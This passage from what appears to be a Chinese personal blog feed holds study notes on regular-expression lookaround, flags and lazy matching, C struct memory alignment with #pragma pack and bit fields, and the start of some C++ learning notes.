零宽度断言（前后预查）"></a>4. 零宽度断言（前后预查）</h2><p>先行断言和后发断言（合称 lookaround）都属于<strong>非捕获组</strong>（用于匹配模式，但不包括在匹配列表中）。当我们需要一个模式的前面或后面有另一个特定的模式时，就可以使用它们。</p><p>例如，我们希望从下面的输入字符串 <code>$4.44</code> 和 <code>$10.88</code> 中获得所有以 <code>$</code> 字符开头的数字，我们将使用以下的正则表达式 <code>(?&lt;=\$)[0-9\.]*</code>。意思是：获取所有包含 <code>.</code> 并且前面是 <code>$</code> 的数字。</p><p>零宽度断言如下：</p><table><thead><tr><th align="center">符号</th><th>描述</th><th align="left">前后</th></tr></thead><tbody><tr><td align="center">?&#x3D;</td><td>正先行断言-存在</td><td align="left">后面</td></tr><tr><td align="center">?!</td><td>负先行断言-排除</td><td align="left">后面</td></tr><tr><td align="center">?&lt;&#x3D;</td><td>正后发断言-存在</td><td align="left">前面</td></tr><tr><td align="center">?&lt;!</td><td>负后发断言-排除</td><td align="left">前面</td></tr></tbody></table><h3 id="4-1-正先行断言"><a href="#4-1-正先行断言" class="headerlink" title="4.1 ?=... 正先行断言"></a>4.1 <code>?=...</code> 正先行断言</h3><p><code>?=...</code> 正先行断言，表示第一部分表达式之后必须跟着 <code>?=...</code>定义的表达式。</p><p>返回结果只包含满足匹配条件的第一部分表达式。<br>定义一个正先行断言要使用 <code>()</code>。在括号内部使用一个问号和等号： <code>(?=...)</code>。</p><p>正先行断言的内容写在括号中的等号后面。<br>例如，表达式 <code>(T|t)he(?=\sfat)</code> 匹配 <code>The</code> 和 <code>the</code>，在括号中我们又定义了正先行断言 <code>(?=\sfat)</code> ，即 <code>The</code> 和 <code>the</code> 后面紧跟着 <code>(空格)fat</code>。</p><pre>"(T|t)he(?=\sfat)" => <a href="#learn-regex"><strong>The</strong></a> fat cat sat on the mat.</pre><p><strong>其实就是<code>(T|t)he</code>后必须有<code>(?+\sfat)</code>才可以匹配</strong></p><p><a href="https://regex101.com/r/IDDARt/1">在线练习</a></p><h3 id="4-2-负先行断言"><a href="#4-2-负先行断言" class="headerlink" title="4.2 ?!... 负先行断言"></a>4.2 <code>?!...</code> 负先行断言</h3><p>负先行断言 <code>?!</code> 用于筛选所有匹配结果，筛选条件为 其后不跟随着断言中定义的格式。<br><code>正先行断言</code>  定义和 <code>负先行断言</code> 一样，区别就是 <code>=</code> 替换成 <code>!</code> 也就是 <code>(?!...)</code>。</p><p>表达式 <code>(T|t)he(?!\sfat)</code> 匹配 <code>The</code> 和 <code>the</code>，且其后不跟着 <code>(空格)fat</code>。</p><pre>"(T|t)he(?!\sfat)" => The fat cat sat on <a href="#learn-regex"><strong>the</strong></a> mat.</pre><p><strong>就是和正先行断言相反，<code>(T|t)he</code>后必须没有<code>(?+\sfat)</code>才可以匹配</strong></p><p><a href="https://regex101.com/r/V32Npg/1">在线练习</a></p><h3 id="4-3"><a href="#4-3" class="headerlink" title="4.3 ?&lt;= ... 正后发断言"></a>4.3 <code>?&lt;= ...</code> 正后发断言</h3><p>正后发断言 记作<code>(?&lt;=...)</code> 用于筛选所有匹配结果，筛选条件为 其前跟随着断言中定义的格式。<br>例如，表达式 <code>(?&lt;=(T|t)he\s)(fat|mat)</code> 匹配 <code>fat</code> 和 <code>mat</code>，且其前跟着 <code>The</code> 或 <code>the</code>。</p><pre>"(?<=(T|t)he\s)(fat|mat)" => The <a href="#learn-regex"><strong>fat</strong></a> cat sat on the <a href="#learn-regex"><strong>mat</strong></a>.</pre><p><strong>其实就是<code>(fat|mat)</code><strong>前面</strong>必须有<code>(?&lt;=(T|t)he\s)</code>才会匹配</strong></p><p><a href="https://regex101.com/r/avH165/1">在线练习</a></p><h3 id="4-4"><a href="#4-4" class="headerlink" title="4.4 ?&lt;!... 负后发断言"></a>4.4 <code>?&lt;!...</code> 负后发断言</h3><p>负后发断言 记作 <code>(?&lt;!...)</code> 用于筛选所有匹配结果，筛选条件为 其前不跟随着断言中定义的格式。<br>例如，表达式 <code>(?&lt;!(T|t)he\s)(cat)</code> 匹配 <code>cat</code>，且其前不跟着 <code>The</code> 或 <code>the</code>。</p><pre>"(?&lt;!(T|t)he\s)(cat)" => The cat sat on <a href="#learn-regex"><strong>cat</strong></a>.</pre><p><strong>其实就是<code>(fat|mat)</code><strong>前面</strong>必须没有<code>(?&lt;=(T|t)he\s)</code>才会匹配</strong></p><p><a href="https://regex101.com/r/8Efx5G/1">在线练习</a></p><h2 id="5-标志"><a href="#5-标志" class="headerlink" title="5. 标志"></a>5. 标志</h2><p>标志也叫模式修正符，因为它可以用来修改表达式的搜索结果。<br>这些标志可以任意的组合使用，它也是整个正则表达式的一部分。</p><table><thead><tr><th align="center">标志</th><th>描述</th></tr></thead><tbody><tr><td align="center">i</td><td>忽略大小写。</td></tr><tr><td align="center">g</td><td>全局搜索。</td></tr><tr><td align="center">m</td><td>多行修饰符：锚点元字符 <code>^</code> <code>$</code> 工作范围在每行的起始。</td></tr></tbody></table><h3 id="5-1-忽略大小写-Case-Insensitive"><a href="#5-1-忽略大小写-Case-Insensitive" class="headerlink" title="5.1 忽略大小写 (Case Insensitive)"></a>5.1 忽略大小写 (Case Insensitive)</h3><p>修饰语 <code>i</code> 用于忽略大小写。<br>例如，表达式 <code>/The/gi</code> 表示在全局搜索 <code>The</code>，在后面的 <code>i</code> 将其条件修改为忽略大小写，则变成搜索 <code>the</code> 和 <code>The</code>，<code>g</code> 表示全局搜索。</p><pre>"The" => <a href="#learn-regex"><strong>The</strong></a> fat cat sat on the mat.</pre><p><a href="https://regex101.com/r/dpQyf9/1">在线练习</a></p><pre>"/The/gi" => <a href="#learn-regex"><strong>The</strong></a> fat cat sat on <a href="#learn-regex"><strong>the</strong></a> mat.</pre><p><a href="https://regex101.com/r/ahfiuh/1">在线练习</a></p><h3 id="5-2-全局搜索-Global-search"><a href="#5-2-全局搜索-Global-search" class="headerlink" title="5.2 全局搜索 (Global search)"></a>5.2 全局搜索 (Global search)</h3><p>修饰符 <code>g</code> 常用于执行一个全局搜索匹配，即（不仅仅返回第一个匹配的，而是返回全部）。<br>例如，表达式 <code>/.(at)/g</code> 表示搜索 任意字符（除了换行）+ <code>at</code>，并返回全部结果。</p><pre>"/.(at)/" => The <a href="#learn-regex"><strong>fat</strong></a> cat sat on the mat.</pre><p><a href="https://regex101.com/r/jnk6gM/1">在线练习</a></p><pre>"/.(at)/g" => The <a href="#learn-regex"><strong>fat</strong></a> <a href="#learn-regex"><strong>cat</strong></a> <a href="#learn-regex"><strong>sat</strong></a> on the <a href="#learn-regex"><strong>mat</strong></a>.</pre><p><a href="https://regex101.com/r/dO1nef/1">在线练习</a></p><h3 id="5-3-多行修饰符-Multiline"><a href="#5-3-多行修饰符-Multiline" class="headerlink" title="5.3 多行修饰符 (Multiline)"></a>5.3 多行修饰符 (Multiline)</h3><p>多行修饰符 <code>m</code> 常用于执行一个多行匹配。</p><p>像之前介绍的 <code>(^,$)</code> 用于检查格式是否是在待检测字符串的开头或结尾。但我们如果想要它在每行的开头和结尾生效，我们需要用到多行修饰符 <code>m</code>。</p><p>例如，表达式 <code>/at(.)?$/gm</code> 表示小写字符 <code>a</code> 后跟小写字符 <code>t</code> ，末尾可选除换行符外任意字符。根据 <code>m</code> 修饰符，现在表达式匹配每行的结尾。</p><pre>"/.at(.)?$/" => The fat                cat sat                on the <a href="#learn-regex"><strong>mat.</strong></a></pre><p><a href="https://regex101.com/r/hoGMkP/1">在线练习</a></p><pre>"/.at(.)?$/gm" => The <a href="#learn-regex"><strong>fat</strong></a>                  cat <a href="#learn-regex"><strong>sat</strong></a>                  on the <a href="#learn-regex"><strong>mat.</strong></a></pre><p><a href="https://regex101.com/r/E88WE2/1">在线练习</a></p><h3 id="6-贪婪匹配与惰性匹配-Greedy-vs-lazy-matching"><a href="#6-贪婪匹配与惰性匹配-Greedy-vs-lazy-matching" class="headerlink" title="6. 贪婪匹配与惰性匹配 (Greedy vs lazy matching)"></a>6. 贪婪匹配与惰性匹配 (Greedy vs lazy matching)</h3><p>正则表达式默认采用贪婪匹配模式，在该模式下意味着会匹配尽可能长的子串。我们可以使用 <code>?</code> 将贪婪匹配模式转化为惰性匹配模式。</p><pre>"/(.*at)/" => <a href="#learn-regex"><strong>The fat cat sat on the mat</strong></a>. </pre><p><a href="https://regex101.com/r/AyAdgJ/1">在线练习</a></p><pre>"/(.*?at)/" => <a href="#learn-regex"><strong>The fat</strong></a> cat sat on the mat. </pre><p><a href="https://regex101.com/r/AyAdgJ/2">在线练习</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>正则表达式的学习</title>
    <link href="/2024/02/05/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/02/05/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="常用的源字符"><a href="#常用的源字符" class="headerlink" title="常用的源字符"></a>常用的源字符</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402050028248.png"></p><p>实际上<code>.</code>这个元字符是不会匹配换行符的，所以不仅仅是<code>\n</code></p><p><code>()</code> <code>[]</code> <code>&#123;&#125;</code>三种括号的作用</p><p><code>()</code>的作用是分组，或者是匹配<code>()</code>中的所有字符，其实就是和数学上的小括号的作用一致，将多个单个字符捆绑起来使得其变成一个字符。</p><p><code>[]</code>的作用是字符种类。匹配方括号内的任意字符。</p><p><code>&#123;&#125;</code>的作用是字符出现的次数，<code>&#123;n,m&#125;</code>匹配num个大括号之前的字符或字符集 (n &lt;&#x3D; num &lt;&#x3D; m).</p><h1 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h1><p>上面提到了<code>[]</code>可以包括一个字符集，使得正则表达式会去匹配其中的任意字符。</p><p>如：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">[Tt]est 就会匹配 Test 和 test<br></code></pre></td></tr></table></figure><p><strong>方括号的句号就表示句号。 表达式 ar[.] 匹配 ar.字符串</strong></p><pre><code class="hljs">    &quot;ar[.]&quot; =&gt; A garage is a good place to park a car.</code></pre><h2 id="否定字符集"><a href="#否定字符集" class="headerlink" title="否定字符集"></a>否定字符集</h2><p>在<code>[]</code>中使用<code>^</code>就变成了否定的意思。</p><pre><code class="hljs">    &quot;[^c]ar&quot; =&gt; The car parked in the garage.</code></pre><h2 id="重复次数"><a href="#重复次数" class="headerlink" title="重复次数"></a>重复次数</h2><p><strong>匹配前面的字符重复的次数</strong></p><table><thead><tr><th>符号</th><th>作用</th></tr></thead><tbody><tr><td>+</td><td>等价于<code>&gt;=1</code>，出现过<strong>1</strong>次以上</td></tr><tr><td>*</td><td>等价于<code>&gt;=0</code>，出现过<strong>0</strong>次以上</td></tr><tr><td>?</td><td>出现过<strong>1次</strong>或者是<strong>0次</strong></td></tr></tbody></table><h2 id="号"><a href="#号" class="headerlink" title="{}号"></a>{}号</h2><p>前面我们大致了解了<code>&#123;&#125;</code>的作用。下面举几个例子</p><p>在正则表达式中 {} 是一个量词，常用来限定一个或一组字符可以重复出现的次数。 例如， 表达式 [0-9]{2,3} 匹配最少 2 位最多 3 位 0~9 的数字。</p><p><strong>我们可以省略第二个参数。</strong> 例如，[0-9]{2,} 匹配至少两位 0~9 的数字。</p><pre><code class="hljs">    &quot;[0-9]&#123;2,&#125;&quot; =&gt; The number was 9.9997 but we rounded it off to 10.0.</code></pre><p>在线练习</p><p><strong>如果逗号也省略掉则表示重复固定的次数。</strong> 例如，[0-9]{3} 匹配3位数字</p><pre><code class="hljs">    &quot;[0-9]&#123;3&#125;&quot; =&gt; The number was 9.9997 but we rounded it off to 10.0.</code></pre><h2 id="号-1"><a href="#号-1" class="headerlink" title="()号"></a>()号</h2><p>和数学上的<code>()</code>的作用是差不多的。特征标群是一组写在 <code>(...)</code> 中的子模式。<code>(...)</code> 中包含的内容将会被看成一个整体，和数学中小括号()的作用相同。例如, 表达式 <code>(ab)*</code> 匹配连续出现 <code>0</code> 或更多个 <code>ab</code>。如果没有使用 <code>(...)</code> ，那么表达式 <code>ab*</code> 将匹配连续出现 <code>0</code> 或更多个 <code>b</code> 。再比如之前说的 {} 是用来表示前面一个字符出现指定次数。但如果在 <code>&#123;&#125;</code> 前加上特征标群 <code>(...)</code> 则表示整个标群内的字符重复 <code>N</code> 次。</p><p>我们还可以在 <code>()</code> 中用或字符 <code>|</code> 表示或。例如，<code>(c|g|p)ar</code> 匹配 <code>car</code> 或 <code>gar</code> 或 <code>par</code>.</p><p>可以使用<code>\num</code>来表示一个<code>()</code>所匹配的字符</p><h1 id="零宽度断言"><a href="#零宽度断言" class="headerlink" title="零宽度断言"></a>零宽度断言</h1><p>先行断言和后发断言（合称 lookaround）都属于非捕获组（用于匹配模式，但不包括在匹配列表中）。当我们需要一个模式的前面或后面有另一个特定的模式时，就可以使用它们。</p><table><thead><tr><th align="center">符号</th><th>描述</th></tr></thead><tbody><tr><td align="center">?&#x3D;</td><td>正先行断言-存在</td></tr><tr><td align="center">?!</td><td>负先行断言-排除</td></tr><tr><td align="center">?&lt;&#x3D;</td><td>正后发断言-存在</td></tr><tr><td align="center">?&lt;!</td><td>负后发断言-排除</td></tr></tbody></table><h2 id="正先行断言"><a href="#正先行断言" class="headerlink" title="?=正先行断言"></a><code>?=</code>正先行断言</h2><p>起作用就是：</p><p>“(T|t)he(?&#x3D;\sfat)” &#x3D;&gt; The fat cat sat on the mat.</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>C语言中的对齐问题</title>
    <link href="/2024/02/05/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E5%AF%B9%E9%BD%90%E9%97%AE%E9%A2%98/"/>
    <url>/2024/02/05/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E5%AF%B9%E9%BD%90%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>C语言中的对齐问题。</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在C语言中对齐问题主要是结构体的对齐和联合体的对齐。这篇文章主要记载结构体的对齐问题</p><p>Intel的IA32架构的处理器则不管数据是否对齐都能正确工作，但是如果想提升性能，应该注意内存对齐方式。ANSI C标准并没有规定相邻声明的变量在内存中一定要相邻。为了程序的高效性，内存对齐问题由编译器自行灵活处理，这样会导致相邻的变量之间有一些填充字节。对于基本数据类型（如int、char等），它们占用的内存空间在一个确定硬件系统下有确定的值。</p><blockquote><p>ANSI C规定一种结构类型的大小是它所有字段的大小及字段之间或字段尾部的填充区大小之和。（填充区就是为了使结构体字段满足内存对齐要求而额外分配给结构体的空间）。</p></blockquote><p>关于一个Linux内核中的宏，这个宏可以查看结构体中成员的偏移值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> OFFEST(t,s) ((size_t)&amp;((t*)0)-&gt;s)</span><br></code></pre></td></tr></table></figure><h2 id="内存对齐的必要性"><a href="#内存对齐的必要性" class="headerlink" title="内存对齐的必要性"></a>内存对齐的必要性</h2><p>内存对齐作为一种强制要求，一方面简化了处理器与内存之间传输系统的设计，另一方面可以提升读取数据的速度。<strong>各个硬件平台在对存储空间的处理上有很大的不同。</strong></p><p>一些平台对某些特定类型的数据只能从某些特定地址开始存取。比如，有些架构的CPU在访问一个没有进行对齐的变量的时候会发生错误，那么在这种架构下编程必须保证字节对齐。<strong>比如说arm平台</strong></p><p>其他平台可能没有这种情况，但是最常见的情况是：如果不按照适合其平台要求对数据存放进行对齐，会在存取效率上带来损失。比如在32位CPU上，一般要求变量地址都是基于4位的，这样可以保证CPU用一次的读写周期就可以读取变量。如果不按4位对齐，如果变量刚好跨4位编码，这样就需要CPU用两次读写周期。</p><p>很显然，这样的效率自然低下。由此也可以简单看出，内存字节对齐是一种典型的“以空间换时间的策略”，在现代计算机拥有较大内存的情况下，这个策略是相当成功的。</p><h1 id="结构体对齐"><a href="#结构体对齐" class="headerlink" title="结构体对齐"></a>结构体对齐</h1><p>实际上，许多计算机系统对基本类型数据在内存中存放的位置有限制，它们会要求这些数据的起始地址的值是某个数k的倍数，这就是所谓的内存对齐，而这个k被称为该数据类型的对齐模数（alignment modulus）。</p><p>计算结构体的对齐的步骤如下：</p><ol><li>将结构体内所有数据成员的长度值相加，记为sum_a。<br><br></li><li>将各数据成员内存对齐，按各自对齐模数而填充的字节数累加到和sum_a上，记为sum_b。对齐模数是#pragma pack指定的数值及该数据成员自身长度中数值较小者。<strong>该数据相对起始位置应该是对齐模数的整数倍。</strong><br><br></li><li>将和sum_b向结构体模数对齐，该模数是#pragma pack指定的数值和结构体内部最大的基本数据类型成员长度中数值较小者，结构体的长度应该是该模数的整数倍。</li></ol><p>使用一个例子来说明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> a；<br>    <span class="hljs-type">char</span> b；<br>&#125;A；<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    A c；<br>    <span class="hljs-type">double</span> d；<br>    <span class="hljs-type">int</span> e；<br>    <span class="hljs-type">char</span> f；<br>&#125;B；<br><br><span class="hljs-comment">//首先我们将结构体A直接展开</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> a；<br>    <span class="hljs-type">char</span> b；<br>    <span class="hljs-type">double</span> d；<br>    <span class="hljs-type">int</span> e；<br>    <span class="hljs-type">char</span> f；<br>&#125;B；<br></code></pre></td></tr></table></figure><p>根据上面的步骤：</p><p>对于结构体B而言：</p><ol><li>结构体内所有数据成员的长度值相加为：sum_a&#x3D;4（int为4个字节的长度）+1（char为1个字节的长度）+8（double为8个字节的长度）+4（int为4个字节的长度）+1（char为1个字节的长度）&#x3D;18。</li><li>数据成员d为了内存对齐，根据“结构体大小的计算方法和步骤”中第2条原则，其对齐模数是8，所以之前需填充3个字节。这时候sum_b&#x3D;sum_a+3&#x3D;21。</li><li>按照定义，结构体对齐模数是结构体内部最大数据成员长度和pragma pack中较小者，而这里前者和后者都为8，因此结构体对齐模数是8。sum_b应该是8的整数倍，所以要在结构体后填充3×8-21&#x3D;3个字节。</li></ol><p>内存空间如图所示：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402060133692.png"></p><p>编写如下程序验证：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> main（<span class="hljs-type">void</span>）<br>&#123;<br>    <span class="hljs-built_in">printf</span>（<span class="hljs-string">&quot;\nsizeof（B）： %d\n&quot;</span>，<span class="hljs-keyword">sizeof</span>（B））；<br>    <span class="hljs-built_in">printf</span>（<span class="hljs-string">&quot;offsetof（B，c）： %d\n&quot;</span><br>            <span class="hljs-string">&quot;（offsetof（A，a）： %d offsetof（A，b）： %d）\n&quot;</span><br>            <span class="hljs-string">&quot;offsetof（B，d）： %d\noffsetof（B，e）： %d\n&quot;</span><br>            <span class="hljs-string">&quot;offsetof（B，f）： %d\n\n&quot;</span>，<br>            offsetof（B，c），offsetof（A，a），offsetof（A，b），<br>            offsetof（B，d），offsetof（B，e），offsetof（B，f））；<br>    B data；<br>    <span class="hljs-built_in">printf</span>（<span class="hljs-string">&quot;B-&gt;c： %u（B-&gt;c.a： %u B-&gt;c.b： %u）\n&quot;</span><br>            <span class="hljs-string">&quot;B-&gt;d： %u\nB-&gt;e： %u\nB-&gt;f： %u\n\n&quot;</span>，<br>            &amp;data.c，&amp;data.c.a， &amp;data.c.b，&amp;data.d，&amp;data.e，&amp;data.f）；<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>；<br>&#125;<br></code></pre></td></tr></table></figure><p>输出如下：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402060137657.png"></p><p>需要注意的是这个输出和不同的系统有关，上面的输出系统是Red Hat Enterprise Linux 6（i386）&#x2F;GCC 4.4.4</p><h2 id="使用指令-pragma-pack"><a href="#使用指令-pragma-pack" class="headerlink" title="使用指令#pragma pack"></a>使用指令#pragma pack</h2><p>除上面默认的内存对齐之外，我们也可以通过下面的方法改变默认的对齐模数。</p><p>使用伪指令#pragma pack（n），n表示对齐模数，它可以是1、2、4、8等，编译器将按照n个字节对齐。</p><p>使用伪指令#pragma pack（），取消自定义字节对齐方式，即将上一次#pragma pack（n）的设置取消，恢复为默认值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> pack（2）</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> a；<br>    <span class="hljs-type">long</span> <span class="hljs-type">double</span> b；<br>&#125;TestStruct1；<br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> pack（）</span><br></code></pre></td></tr></table></figure><ol><li>结构体内所有数据成员的长度值相加为：sum_a&#x3D;1（char为1个字节的长度）+8（long double为8个字节的长度）&#x3D;9。</li><li>将数据成员a放在相对偏移0处，之前不需要填充字节。数据成员b为了内存对齐，根据“结构体大小的计算方法和步骤”中第2条原则，其对齐模数是2，所以之前需要填充1个字节。这时候sum_b&#x3D;sum_a+1&#x3D;10。</li><li>按照定义，结构体对齐模数是结构体内部最大数据成员长度和pragma pack中较小者，而这里前者为8，后者为2，所以结构体对齐模数是2。sum_b是2的5倍，因此不需要再次对齐。</li></ol><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402060141561.png"></p><p>特殊的，可以使用<code>#pragma pack(1)</code>来使得系统不进行结构体对齐 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> pack（1）</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> a；<br>    <span class="hljs-type">long</span> <span class="hljs-type">double</span> b；<br>&#125;TestStruct1；<br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> pack（）</span><br></code></pre></td></tr></table></figure><p>上面的结构体的大小为17，在gcc version 11.4.0 (Ubuntu 11.4.0-1ubuntu1~22.04)上的输出</p><p>如果没有这些预处理语句则结果为32</p><h1 id="位域"><a href="#位域" class="headerlink" title="位域"></a>位域</h1><p>C语言提供了一个称之为位域语法，实际上就是可以结构体中的成员直接按照<code>bit</code>来存储，而不是按照<code>byte</code>来存储。</p><p>注意：</p><ul><li>位域只可以对于整数类型使用</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> one:<span class="hljs-number">1</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> two:<span class="hljs-number">3</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> three:<span class="hljs-number">10</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> four:<span class="hljs-number">5</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> :<span class="hljs-number">2</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> five:<span class="hljs-number">8</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> six:<span class="hljs-number">8</span>;<br>&#125; demo_type;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    demo_type s = &#123; <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">513</span>, <span class="hljs-number">17</span>, <span class="hljs-number">129</span>, <span class="hljs-number">0x81</span> &#125;;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;sizeof demo_type=%u\n&quot;</span>,<span class="hljs-keyword">sizeof</span>(demo_type));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;values: s=%u,%u,%u,%u,%u,%u\n&quot;</span>,<br>      s.one, s.two, s.three, s.four, s.five, s.six);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>结构体的布局如下：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402060157778.png"></p><p>从上面这个图可以知道位域的含义。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li>《编写高质量代码——改善C、C++程序的151个建议》</li></ul>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C++信息3笔记-1</title>
    <link href="/2024/02/03/C++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/"/>
    <url>/2024/02/03/C++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/</url>
    
    <content type="html"><![CDATA[<p>记载C++的学习笔记</p><span id="more"></span><h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> iostream std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;nihao&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里要区分的是”\n”和endl的区别，实际上endl就是”\n”+fflush()，也就是说endl还会对于刷新缓冲区。</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ol><li><p>命令空间（namespace)，在协同开发的时候，为了防止不同的程序员设置了不相同的对象\函数名称，所以引入了命令空间的概念。实际上就相当于是一个个的命令块。想要使用<code>string</code>、<code>cin</code> <code>cout</code>等等对象 ,则需要将<code>std</code>包裹进来.</p></li><li><p>:: 叫作用域区分符，指明一个函数属于哪个类或一个数据属于哪个类。:: 可以不跟类名，表示全局数据或全局函数（即非成员函数）。<br>例如:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 